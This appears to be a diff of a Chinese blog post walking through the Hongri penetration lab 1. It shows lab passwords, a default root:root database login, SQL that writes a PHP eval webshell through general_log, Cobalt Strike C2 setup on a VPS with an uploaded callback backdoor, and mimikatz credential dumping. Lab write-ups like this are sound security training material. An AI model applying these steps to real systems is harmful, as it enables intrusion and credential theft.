@@ -5,13 +5,13 @@
 <meta property="og:site_name" content="clown">
 <meta property="og:description" content="靶场说明虚拟机的统一密码： hongrisec@2019&#x2F;&#x2F;有些靶机密码过期需要更改，统一改成下面这个Hongrisec@2019  官方的靶场描述 一、环境搭建1.环境搭建测试2.信息收集 二、漏洞利用3.漏洞搜索与利用4.后台Getshell上传技巧5.系统信息收集6.主机密码收集 三、内网搜集7.内网–继续信息收集8.内网攻击姿势–信息泄露9.内网攻击姿势-MS08-06710.内网攻击姿势">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329154902.jpg">
+<meta property="og:image" content="http://cdn.clown2024.cn/202407151814121.jpg">
 <meta property="article:published_time" content="2024-05-02T10:47:46.000Z">
-<meta property="article:modified_time" content="2024-05-20T15:53:40.699Z">
+<meta property="article:modified_time" content="2024-07-15T09:39:30.501Z">
 <meta property="article:author" content="clown">
 <meta property="article:tag" content="渗透靶场">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/clowsman/image@main/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240329154902.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"><link rel="canonical" href="https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+<meta name="twitter:image" content="http://cdn.clown2024.cn/202407151814121.jpg"><link rel="shortcut icon" href="http://cdn.clown2024.cn/202407151818951.jpeg"><link rel="canonical" href="https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
   root: '/',
   algolia: undefined,
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
@@ -56,7 +56,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2024-05-20 23:53:40'
+  postUpdate: '2024-07-15 17:39:30'
 }</script><script>(win=>{
       win.saveToLocal = {
         set: (key, value, ttl) => {
@@ -153,7 +153,8 @@
         }
       }
       detectApple()
-    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-02T10:47:46.000Z" title="发表于 2024-05-02 18:47:46">2024-05-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-05-20T15:53:40.699Z" title="更新于 2024-05-20 23:53:40">2024-05-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="靶场说明"><a href="#靶场说明" class="headerlink" title="靶场说明"></a>靶场说明</h1><p>虚拟机的统一密码：</p>
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="clown" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://cdn.clown2024.cn/202407151818951.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">52</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">27</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://cdn.clown2024.cn/202407151814121.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="http://cdn.clown2024.cn/202407151818951.jpeg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场-1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-05-02T10:47:46.000Z" title="发表于 2024-05-02 18:47:46">2024-05-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-07-15T09:39:30.501Z" title="更新于 2024-07-15 17:39:30">2024-07-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日靶场-1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1><span id="靶场说明">靶场说明</span></h1><p>虚拟机的统一密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hongrisec@2019<br>//有些靶机密码过期需要更改，统一改成下面这个<br>Hongrisec@2019<br></code></pre></td></tr></table></figure>
 
 <p><strong>官方的靶场描述</strong></p>
@@ -165,41 +166,41 @@
 <p>六、持久控制<br>19.域渗透-域成员信息收集<br>20.域渗透-基础服务弱口令探测及深度利用之powershell<br>21.域渗透-横向移动[wmi利用]<br>22.域渗透-C2命令执行<br>23.域渗透-利用DomainFronting实现对beacon的深度隐藏<br>24.域渗透-域控实现与利用</p>
 <p>七、痕迹清理<br>25、日志清理</p>
 <p><strong>靶场拓扑结构</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502190140254.png" alt="image-20240502190140254"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502222209415.png" alt="image-20240502222209415"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737522.png" alt="image-20240502190140254"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737523.png" alt="image-20240502222209415"></p>
 <blockquote>
 <p>win7为网站服务器，winServer为域成员，win2k3为域控</p>
 </blockquote>
-<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>这里win7相当于网站服务器，需要两个网卡，我这里设置为VMnet2(仅主机模式)和VMnet8(NAT模式，和外界连通)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502223937110.png" alt="image-20240502223937110"></p>
+<h2><span id="环境配置">环境配置</span></h2><p>这里win7相当于网站服务器，需要两个网卡，我这里设置为VMnet2(仅主机模式)和VMnet8(NAT模式，和外界连通)</p>
+<p><img src="http://cdn.clown2024.cn/202407151737525.png" alt="image-20240502223937110"></p>
 <p><strong>win7</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502224014134.png" alt="image-20240502224014134"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737526.png" alt="image-20240502224014134"></p>
 <p><strong>win_server</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502224057123.png" alt="image-20240502224057123"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737527.png" alt="image-20240502224057123"></p>
 <p><strong>win2k3</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502224144546.png" alt="image-20240502224144546"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737528.png" alt="image-20240502224144546"></p>
 <p>设置完之后需要去网络共享将ipv4改成自动获取地址，然后Windows7防火墙要关闭不然外界ping不通；</p>
 <p>最后去相互ping一下看能否连通即可</p>
 <p>最后启动win7上的web服务即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502234452111.png" alt="image-20240502234452111"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737529.png" alt="image-20240502234452111"></p>
 <p>然后去访问一下是能看到php探针的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502234617353.png" alt="image-20240502234617353"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737530.png" alt="image-20240502234617353"></p>
 <blockquote>
 <p>难绷后面发现win7使用<strong>net user &#x2F;domain</strong>连不上域网络，配了好久才好但也不清楚具体什么原因；配置的时候就严格按照官方的网段来配置重新配了一遍，将VMnet2网卡配置成192.168.52.xx网段，因为虚拟机一开始就已经配置了固定的ip。</p>
 </blockquote>
-<h1 id="Web页面渗透"><a href="#Web页面渗透" class="headerlink" title="Web页面渗透"></a>Web页面渗透</h1><h2 id="php探针"><a href="#php探针" class="headerlink" title="php探针"></a>php探针</h2><p>就直接先从php的探针首页开始入手，从这里开始渗透这个Web网站</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502235433732.png" alt="image-20240502235433732"></p>
+<h1><span id="web页面渗透">Web页面渗透</span></h1><h2><span id="php探针">php探针</span></h2><p>就直接先从php的探针首页开始入手，从这里开始渗透这个Web网站</p>
+<p><img src="http://cdn.clown2024.cn/202407151737531.png" alt="image-20240502235433732"></p>
 <p>看到有个mysql连接先检测一下看看，直接root、root尝试一下</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502235519904.png" alt="image-20240502235519904"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737532.png" alt="image-20240502235519904"></p>
 <p>运气很好直接成功了，但是现在暂时没什么用</p>
-<h2 id="其他页面"><a href="#其他页面" class="headerlink" title="其他页面"></a>其他页面</h2><p>那就惯例来目录扫描看一看，这里用gobuster</p>
+<h2><span id="其他页面">其他页面</span></h2><p>那就惯例来目录扫描看一看，这里用gobuster</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.134/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240502235937240.png" alt="image-20240502235937240"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737533.png" alt="image-20240502235937240"></p>
 <p>但是基本都是403，但是有一个phpmyadmin后台页面开着</p>
 <p>然后用我们刚刚测试出来的数据库用户名和密码直接就可以登进去了(root:root)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503000212471.png" alt="image-20240503000212471"></p>
-<h2 id="phpmyadmin后台getshell"><a href="#phpmyadmin后台getshell" class="headerlink" title="phpmyadmin后台getshell"></a>phpmyadmin后台getshell</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071314.html">https://www.cnblogs.com/0nc3/p/12071314.html</a></p>
+<p><img src="http://cdn.clown2024.cn/202407151737534.png" alt="image-20240503000212471"></p>
+<h2><span id="phpmyadmin后台getshell">phpmyadmin后台getshell</span></h2><p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071314.html">https://www.cnblogs.com/0nc3/p/12071314.html</a></p>
 <p>总结一下大致有这几种getshell方式：</p>
 <ol>
 <li><p>select into outfile直接写入shell</p>
@@ -219,59 +220,59 @@
 <p>一开始尝试直接into outfile写入木马失败，绝对路径可以从上面的php探针页面知道网站的绝对路径为：<code> 	C:/phpStudy/WWW</code>，也可以通过@@basedir来查询，只不过查到的是mysql的根目录，但是可以反推一下</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503002537962.png" alt="image-20240503002537962"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737535.png" alt="image-20240503002537962"></p>
 <p>去看一下参数</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503002657736.png" alt="image-20240503002657736"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737536.png" alt="image-20240503002657736"></p>
 <p>这里为NULL代表限制mysql不允许导入导出，那就只能看一下其他方法了</p>
 <p><strong>全局日志写shell</strong></p>
 <p>这里看看全局日志的配置情况</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503002947148.png" alt="image-20240503002947148"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737537.png" alt="image-20240503002947148"></p>
 <p>然后我们可以开启general_log，并修改文件位置为我们的网站的shell.php</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503003300408.png" alt="image-20240503003300408"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737538.png" alt="image-20240503003300408"></p>
 <p>接下来我们直接查询一下木马就会写入日志了</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot;<br></code></pre></td></tr></table></figure>
 
 <p>最后蚁剑连接成功getshell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503003518399.png" alt="image-20240503003518399"></p>
-<h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>我们getshell之后可以看到还有一个yxcms，这是当时没扫出来的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503003928666.png" alt="image-20240503003928666"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737539.png" alt="image-20240503003518399"></p>
+<h2><span id="yxcms">yxcms</span></h2><p>我们getshell之后可以看到还有一个yxcms，这是当时没扫出来的</p>
+<p><img src="http://cdn.clown2024.cn/202407151737540.png" alt="image-20240503003928666"></p>
 <p>这个地方看网上也是一个后台，在首页的公告栏处就会有账号密码，登陆之后就可以直接添加一个shell.php的文件了，这里就不测了。</p>
-<h1 id="CS打法"><a href="#CS打法" class="headerlink" title="CS打法"></a>CS打法</h1><p>这里刚好熟悉一下cs的使用，用cs来上线靶机，cs的简单部署也直接记录在这里好了</p>
-<h2 id="cs部署"><a href="#cs部署" class="headerlink" title="cs部署"></a>cs部署</h2><p>先安装java环境，网上随便找个教程即可，这里安装java8参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2105638">https://cloud.tencent.com/developer/article/2105638</a></p>
+<h1><span id="cs打法">CS打法</span></h1><p>这里刚好熟悉一下cs的使用，用cs来上线靶机，cs的简单部署也直接记录在这里好了</p>
+<h2><span id="cs部署">cs部署</span></h2><p>先安装java环境，网上随便找个教程即可，这里安装java8参考：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2105638">https://cloud.tencent.com/developer/article/2105638</a></p>
 <p>这里记录一下安装命令：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">先官网下载一个jdk包，创建一个目录存放解压后文件，我这里的jdk是<span class="hljs-string">&quot;jdk-8u401-linux-x64.tar.gz&quot;</span></span><br>sudo mkdir /usr/lib/jvm<br>sudo tar -zxvf jdk-8u401-linux-x64.tar.gz -C /usr/lib/jvm<br><span class="hljs-meta prompt_">#</span><span class="language-bash">修改环境变量</span><br>sudo vim ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">文件末尾添加</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span> oracle jdk environment</span><br>export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_401  ## 这里要注意目录要换成自己解压的jdk 目录<br>export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  <br>export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  <br>export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH <br><span class="hljs-meta prompt_">#</span><span class="language-bash">使环境变量生效</span><br>source ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置默认jdk</span><br>sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_401/bin/java 300  <br>sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_401/bin/javac 300  <br>sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_401/bin/jar 300   <br>sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_401/bin/javah 300   <br>sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_401/bin/javap 300 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">执行</span><br>sudo update-alternatives --config java<br><span class="hljs-meta prompt_">#</span><span class="language-bash">测试安装成功</span><br>java -version<br>javac -version<br></code></pre></td></tr></table></figure>
 
 <p>用一台外网主机来部署cs服务器，要给server目录下的teamserver文件可执行权限</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503112207679.png" alt="image-20240503112207679"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737541.png" alt="image-20240503112207679"></p>
 <p>然后启动团队服务器，设置当前服务器的ip地址和密码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver &lt;vps地址&gt; &lt;密码&gt;<br></code></pre></td></tr></table></figure>
 
 <p>然后利用启动脚本启动，我用的4.8版本只有一个启动脚本，其他版本是分不同系统不同的启动脚本，我这里启动脚本在Windows启动不了，环境没搞定，所以我就用kali了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503162849976.png" alt="image-20240503162849976"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737542.png" alt="image-20240503162849976"></p>
 <p>然后输入主机和密码登陆即可，用户名随便定</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503163035180.png" alt="image-20240503163035180"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737543.png" alt="image-20240503163035180"></p>
 <blockquote>
 <p>我这里服务器搭在了腾讯云上面，记得要开放50050的防火墙端口才能连上</p>
 <p>具体功能使用可以看这篇文章：<a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p>
 <p>云服务器搭建可能出现的问题参考这篇文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/14027939.html">云服务器上搭建cobalt strike遇到的一些小问题 - 亨利其实很坏 - 博客园 (cnblogs.com)</a></p>
 </blockquote>
-<h2 id="cs上线靶机"><a href="#cs上线靶机" class="headerlink" title="cs上线靶机"></a>cs上线靶机</h2><p>生成一个Windows后门通过蚁剑上传到靶机</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503164400241.png" alt="image-20240503164400241"></p>
+<h2><span id="cs上线靶机">cs上线靶机</span></h2><p>生成一个Windows后门通过蚁剑上传到靶机</p>
+<p><img src="http://cdn.clown2024.cn/202407151737544.png" alt="image-20240503164400241"></p>
 <p>在这之前要先配置一个监听器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503165738645.png" alt="image-20240503165738645"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737545.png" alt="image-20240503165738645"></p>
 <p>利用蚁剑上传到网站后，运行该程序即可看到靶机上线</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503165821623.png" alt="image-20240503165821623"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737546.png" alt="image-20240503165821623"></p>
 <p>可以直接右击靶机利用mimikatz抓取本地密码，或者直接输入hashdump列出用户哈希</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503170150900.png" alt="image-20240503170150900"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737547.png" alt="image-20240503170150900"></p>
 <p>然后利用Explore&#x3D;》new view探测一下其他主机</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503170603756.png" alt="image-20240503170603756"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240503170916667.png" alt="image-20240503170916667"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737548.png" alt="image-20240503170603756"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737549.png" alt="image-20240503170916667"></p>
 <p>扫出了我们内网的另外两台靶机</p>
 <p><strong>域内信息搜集</strong></p>
 <p>麻了，这里win7连不上域控是真的无语，也不知道网卡出了什么问题搞了半天。</p>
@@ -279,54 +280,54 @@
 <p>后来严格按照官网重新配了一遍才好，上面也有说明；</p>
 </blockquote>
 <p>可以使用sleep 0加快一下交互，不过实战可能最好不要，因为容易被发现</p>
